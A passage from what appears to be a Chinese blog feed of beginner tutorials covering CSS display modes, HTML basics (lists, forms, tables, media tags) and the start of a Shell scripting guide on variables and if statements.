title="块元素特点"></a>块元素特点</h4><ul><li>独占一行</li><li>高度、宽度、外边距以及内边距都可以控制</li><li>宽度默认是容器的100%，里面可以放行内或者块级元素</li><li>文字类块级标签（<code>h1</code> ，<code>p</code> ，<code>dt</code>）里面不能放块级元素，特别是 <code>p</code>  里不能放 <code>div</code></li></ul><h3 id="2-行内元素（inline-level）"><a href="#2-行内元素（inline-level）" class="headerlink" title="2. 行内元素（inline-level）"></a>2. 行内元素（inline-level）</h3><h4 id="常见行内元素"><a href="#常见行内元素" class="headerlink" title="常见行内元素"></a>常见行内元素</h4><p><code>&lt;a&gt;</code> ，<code>&lt;strong&gt;</code>，<code>&lt;b&gt;</code>， <code>&lt;em&gt;</code>， <code>&lt;span&gt;</code> 等，其中 <code>&lt;span&gt;</code> 是最典型的行内（内联）元素</p><h4 id="行内元素的特点"><a href="#行内元素的特点" class="headerlink" title="行内元素的特点"></a>行内元素的特点</h4><ul><li>一行可以显示多个行内元素</li><li>高度、宽度直接设置是无效的</li><li>默认高度就是它本身内容的宽度</li><li>行内元素只能容纳文本或其他行内元素</li><li>链接里面不能再放链接，特殊情况下 <code>a</code> 里面可以放块级元素，但是最好是给 <code>a</code> 转换成块级模式最安全</li></ul><h3 id="3-行内块元素（inline-block）"><a href="#3-行内块元素（inline-block）" class="headerlink" title="3. 行内块元素（inline-block）"></a>3. 行内块元素（inline-block）</h3><p>在行内元素中有几个特殊标签 <code>&lt;img&gt;</code> ，<code>&lt;input&gt;</code>，<code>&lt;td&gt;</code> </p><ul><li>不独占一行</li><li>可以直接设置高度、宽度、行高、外边距以及内边距</li></ul><h3 id="三种模式总结"><a href="#三种模式总结" class="headerlink" title="三种模式总结"></a>三种模式总结</h3><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">元素模式</td><td align="left">元素排列</td><td align="left">设置样式</td><td align="left">默认宽度</td><td align="left">包含</td></tr><tr><td align="left">块级元素</td><td align="left">一行只能放一个块级元素</td><td align="left">可以设置宽度高度</td><td align="left">容器的100%</td><td align="left">容器级可以包含任何标签</td></tr><tr><td align="left">行内元素</td><td align="left">一行可以放多个行内元素</td><td align="left">不可以直接设置宽度高度</td><td align="left">它本身内容的宽度</td><td align="left">容纳文本或则其他行内元素</td></tr><tr><td align="left">行内块元素</td><td align="left">一行放多个行内块元素</td><td align="left">可以设置宽度和高度</td><td align="left">它本身内容的宽度</td><td align="left"></td></tr></tbody></table><h3 id="标签显示模式转换-display"><a href="#标签显示模式转换-display" class="headerlink" title="标签显示模式转换 display"></a>标签显示模式转换 display</h3><ul><li>块转行内：<code>display:inline;</code></li><li>行内转块：<code>display:block;</code></li><li>块、行内元素转换为行内块：<code>display:inline-block;</code></li></ul><blockquote><p>参考文章： <a href="https://www.jb51.net/css/793626.html">CSS基础详解</a> | <a href="https://www.gxlcms.com/qianduan-468878.html">CSS中什么是行高 </a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML 基础</title>
    <link href="/2022/06/20/HTML%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/20/HTML%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h1><blockquote><p>Hyper Text Markup Language 是一种标记语言，通过标记对内容进行描述，从而提供超出普通文本的信息。</p></blockquote><h2 id="HTML-组成"><a href="#HTML-组成" class="headerlink" title="HTML 组成"></a>HTML 组成</h2><p>包含三部分：</p><ul><li>文本内容</li><li>引用（图片、音视频、样式表、JS文件以及其他HTML文件等）</li><li>标记（预先定义好的、描述语义的标签）</li></ul><p><strong>标记只代表语义</strong></p><p>HTML元素用于描述当前文本的语义，与显示样式无关，例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>说明当前是一个段落（paragraph）<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>说明当前是一个链接，或者叫锚点（anchor）<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h2><p>HTML在客户端被浏览器组织成一个树形结构，就是 DOM(Document Object Mode) tree，浏览器对网页的显示、CSS的样式和元素选择、JS的DOM节点操作都是以DOM tree为基础的。</p><h3 id="树形结构中的关系"><a href="#树形结构中的关系" class="headerlink" title="树形结构中的关系"></a>树形结构中的关系</h3><ul><li>后代（ancestor and descendent）</li><li>父子（parent and child）</li><li>兄弟（siblings）</li></ul><h2 id="文档流"><a href="#文档流" class="headerlink" title="文档流"></a>文档流</h2><p>浏览器在渲染HTML时将其看做是一个个节点组成的流，按照从上到下，从左到右的顺序依次展示。</p><h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>将元素所占的空间类比成生活中的盒子（BOX），从外到内依次是 <code>margin</code> 、<code>border</code>和<code>padding</code></p><p><img src="/../blog-assets/HTML+CSS/1655703787374.png" alt="1655703787374"></p><h2 id="HTML-基本结构"><a href="#HTML-基本结构" class="headerlink" title="HTML 基本结构"></a>HTML 基本结构</h2><h3 id="文档基本结构"><a href="#文档基本结构" class="headerlink" title="文档基本结构"></a>文档基本结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        元数据和标题<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        页面显示内容<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="元素、属性和值"><a href="#元素、属性和值" class="headerlink" title="元素、属性和值"></a>元素、属性和值</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>Email Address<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;blue.jpg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200px&quot;</span></span><br></code></pre></td></tr></table></figure><ul><li>大小写不敏感，但建议使用小写</li><li>不要忘记了结束标签，使用时总是成对使用开始&#x2F;结束标签</li></ul><h2 id="HTML-标记"><a href="#HTML-标记" class="headerlink" title="HTML 标记"></a>HTML 标记</h2><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>链接到其他网页</li><li>链接到指定区域</li><li>其他类型链接</li></ul><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ol><li>有序列表</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#jys&quot;</span>&gt;</span>静夜思<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>无序列表</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#jys&quot;</span>&gt;</span>静夜思<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>描述列表</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>入朝洛堤步月<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>唐 上官仪<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>嵌套列表</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/lb&quot;</span>&gt;</span>李白<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#sdn&quot;</span>&gt;</span>蜀道难<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#jys&quot;</span>&gt;</span>静夜思<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><h3 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h3><p>HTML5对表单进行了扩展和改进，增加了常用的表单输入控件类型等</p><table><thead><tr><th>标签</th><th>输入类型</th><th>示例代码</th></tr></thead><tbody><tr><td>input</td><td>文本</td><td><code>&lt;input type=&quot;text&quot; /&gt;</code></td></tr><tr><td>input</td><td>密码</td><td><code>&lt;input type=&quot;password&quot; required=&quot;required&quot; /&gt;</code></td></tr><tr><td>input</td><td>提交</td><td><code>&lt;input type=&quot;submit&quot; /&gt;</code></td></tr><tr><td>input</td><td>隐藏</td><td><code>&lt;input type=&quot;hidden&quot; value=&quot;test&quot; /&gt;</code></td></tr><tr><td>input</td><td>邮箱</td><td><code>&lt;input type=&quot;email&quot; /&gt;</code></td></tr><tr><td>input</td><td>搜索</td><td><code>&lt;input type=&quot;search&quot; /&gt;</code></td></tr><tr><td>input</td><td>电话</td><td><code>&lt;input type=&quot;tel&quot; /&gt;</code></td></tr><tr><td>input</td><td>URL</td><td><code>&lt;input type=&quot;url&quot; pattern=&quot;\d&#123;2&#125;-\d&#123;8&#125;&quot; /&gt;</code></td></tr><tr><td>input</td><td>单选框</td><td><code>&lt;input type=&quot;radio&quot; name=&quot;rd1&quot; value=&quot;male&quot; checked /&gt;</code></td></tr><tr><td>input</td><td>复选框</td><td><code>&lt;input type=&quot;checkbox&quot; name=&quot;cb1&quot; value=&quot;java&quot; checked /&gt;</code></td></tr><tr><td>input</td><td>文件上传</td><td><code>&lt;input type=&quot;file&quot; name=&quot;cb1&quot; value=&quot;java&quot; checked /&gt;</code></td></tr><tr><td>textarea</td><td>多行文本框</td><td><code>&lt;textarea name=&quot;ta&quot; cols=&quot;40&quot; rows=&quot;40&quot; /&gt;</code></td></tr><tr><td>select</td><td>下拉选择</td><td><code>&lt;select name=&quot;se&quot;&gt;&lt;option value=&quot;1&quot; /&gt;&lt;option value=&quot;2&quot; /&gt;&lt;/select&gt;</code></td></tr><tr><td>button</td><td>按钮</td><td><code>&lt;button type=&quot;submit&quot;&gt; &lt;img src=&quot;upload.png&quot;/&gt; UPLOAD&lt;/button&gt;</code></td></tr></tbody></table><h3 id="表单提交"><a href="#表单提交" class="headerlink" title="表单提交"></a>表单提交</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cb1&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;req.jsp&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>name</code> 属性表示提交到后台的字段名，可以重复，checkbox和radio以相同的name成为一组；</li><li><code>id</code> 属性在整个html文档中唯一标识一个元素，与提交到后台数据无关；</li><li><code>disabled=&quot;disabled&quot;</code> 的表单元素不仅标识元素禁用，且不会提交到后台</li></ol><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>唐朝诗人留存诗集数统计<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>字<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>留存诗集数（首）<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>李白<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>太白<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>青莲居士<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1010<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>杜甫<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>子美<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>少陵野老<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1500<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>共计<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2610<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="视频和音频"><a href="#视频和音频" class="headerlink" title="视频和音频"></a>视频和音频</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;static/piano.mp3&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;static/dance.mp4&quot;</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">autoplay</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shell 脚本基础</title>
    <link href="/2022/06/18/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/18/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Shell-入门简介"><a href="#一、Shell-入门简介" class="headerlink" title="一、Shell 入门简介"></a>一、Shell 入门简介</h1><h2 id="什么是-shell"><a href="#什么是-shell" class="headerlink" title="什么是 shell"></a>什么是 shell</h2><blockquote><p>Shell 通过提示您输入，向操作系统解释该输入，然后处理来自操作系统的任何结果输出，简单来说 Shell 就是一个用户跟操作系统之间的一个命令解释器。</p></blockquote><p>shell 本质上是 Linux 命令，多条命令组合在一起，实现某一目的，就构成了 shell 脚本</p><h2 id="shell-编程注意事项"><a href="#shell-编程注意事项" class="headerlink" title="shell 编程注意事项"></a>shell 编程注意事项</h2><ul><li><p>脚本命名：一般为<strong>英文字母、数字、下划线</strong>组成，以 <code>.sh</code> 为后缀</p></li><li><p>脚本首行需要以 <code>#!/bin/bash</code>  开头</p></li><li><p>脚本变量不能以数字、特殊符号开头，可以使用英文字母、下划线</p></li><li><p>在linux下编写shell脚本，赋予权限即可运行。如果是在windows下编写，有时候会报错， 原因是windows系统下换行符为 <code>\r\n</code>，linux下换行符为 <code>\n</code>，所以导致在windows下编写的文件会比linux下多回车符号 <code>\r</code>，这种情况可以使用以下方法解决：</p></li></ul><p>  用 vim 来重新编辑脚本，首先查看文件格式：</p><p>  <img src="/../blog-assets/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/20201221104704210.png" alt="img"></p><p>  在底行模式下输入 <strong>set ff</strong>，回车可以看到文件格式为 <code>dos</code>；</p><p>  <img src="/../blog-assets/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/20201221104716521.png" alt="img"><br>  底行模式下输入 <strong>set ff&#x3D;unix</strong> ，修改文件格式为 <code>unix</code> 后保存退出即可。</p><p>  <img src="/../blog-assets/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/20201221104928703.png" alt="img">  </p><h2 id="Hello-World-实战"><a href="#Hello-World-实战" class="headerlink" title="Hello World 实战"></a>Hello World 实战</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-8-8-centos bbb]<span class="hljs-comment"># touch helloworld.sh</span><br>[root@VM-8-8-centos bbb]<span class="hljs-comment"># vim helloworld.sh </span><br>[root@VM-8-8-centos bbb]<span class="hljs-comment"># cat helloworld.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># This is our first shell</span><br><span class="hljs-comment"># by author dunkingcurry 2022.06</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello world!&quot;</span><br>[root@VM-8-8-centos bbb]<span class="hljs-comment"># chmod o+x helloworld.sh </span><br>[root@VM-8-8-centos bbb]<span class="hljs-comment"># ./helloworld.sh </span><br>hello world!<br></code></pre></td></tr></table></figure><h1 id="二、Shell-变量详解"><a href="#二、Shell-变量详解" class="headerlink" title="二、Shell 变量详解"></a>二、Shell 变量详解</h1><blockquote><p>shell 编程中常见变量一般分为三种：系统变量、环境变量和用户变量</p></blockquote><h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><p>主要是用于 <strong>对参数判断和命令返回值判断</strong> 时使用，详解如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$0</span> 当前脚本的名称;<br><span class="hljs-variable">$n</span> 当前脚本的第n个参数,n=1,2,…9;<br>$* 当前脚本的所有参数(不包括程序本身);<br><span class="hljs-variable">$#</span> 当前脚本的参数个数(不包括程序本身);<br>$? 0 或程序执行完后的状态，返回0表示执行成功;<br>$$ 程序本身的PID号<br></code></pre></td></tr></table></figure><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>主要是在<strong>程序运行时需要设置</strong>，详解如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$PATH</span>   命令所示路径，以冒号为分割;<br><span class="hljs-variable">$HOME</span>   打印用户家目录;<br><span class="hljs-variable">$SHELL</span>  显示当前Shell类型;<br><span class="hljs-variable">$USER</span>   打印当前用户名;<br><span class="hljs-variable">$ID</span>     打印当前用户<span class="hljs-built_in">id</span>信息;<br><span class="hljs-variable">$PWD</span>    显示当前所在路径;<br><span class="hljs-variable">$TERM</span>   打印当前终端类型;<br><span class="hljs-variable">$HOSTNAME</span>    显示当前主机名;<br><span class="hljs-variable">$PS1</span>         定义主机命令提示符的;<br><span class="hljs-variable">$HISTSIZE</span>    历史命令大小，可通过 HISTTIMEFORMAT 变量设置命令执行时间;<br><span class="hljs-variable">$RANDOM</span>      随机生成一个 0 至 32767 的整数;<br></code></pre></td></tr></table></figure><h2 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h2><p>用户变量又称为局部变量，主要用<strong>在Shell脚本内部或者临时局部使用</strong>，详解如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=rivers        自定义变量A;<br>BACK_DIR=/data/backup/         自定义变量BACK_DIR<br></code></pre></td></tr></table></figure><h1 id="三、Shell-流程控制"><a href="#三、Shell-流程控制" class="headerlink" title="三、Shell 流程控制"></a>三、Shell 流程控制</h1><h2 id="1-if-条件语句"><a href="#1-if-条件语句" class="headerlink" title="1. if 条件语句"></a>1. if 条件语句</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>通常以 <code>if</code> 开头，<code>fi</code> 结尾，也可加入<code>else</code>或者<code>elif</code>进行多条件的判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 单分支语句 ---比较大小</span><br><span class="hljs-keyword">if</span> [ 条件表达式 ];<span class="hljs-keyword">then</span><br>语句1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 双分支if 语句</span><br><span class="hljs-keyword">if</span> [ 条件表达式 ]<br>语句1<br><span class="hljs-keyword">else</span><br>语句2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 多支条件语句 ---判断成绩</span><br><span class="hljs-keyword">if</span> [ 条件表达式 ]<br>语句1<br><span class="hljs-keyword">elif</span> [ 条件表达式 ];<span class="hljs-keyword">then</span><br>语句2<br><span class="hljs-keyword">elif</span> [ 条件表达式 ];<span class="hljs-keyword">then</span><br>语句2<br><span class="hljs-keyword">fi</span>  <br></code></pre></td></tr></table></figure><h3 id="常见逻辑判断运算符"><a href="#常见逻辑判断运算符" class="headerlink" title="常见逻辑判断运算符"></a>常见逻辑判断运算符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f 判断文件是否存在 eg: <span class="hljs-keyword">if</span> [ -f filename ];<br>-d 判断目录是否存在 eg: <span class="hljs-keyword">if</span> [ -d <span class="hljs-built_in">dir</span> ];<br>-eq等于，应用于整型比较 equal;<br>-ne不等于，应用于整型比较 not equal;<br>-lt小于，应用于整型比较 letter;<br>-gt大于，应用于整型比较 greater;<br>-le小于或等于，应用于整型比较;<br>-ge 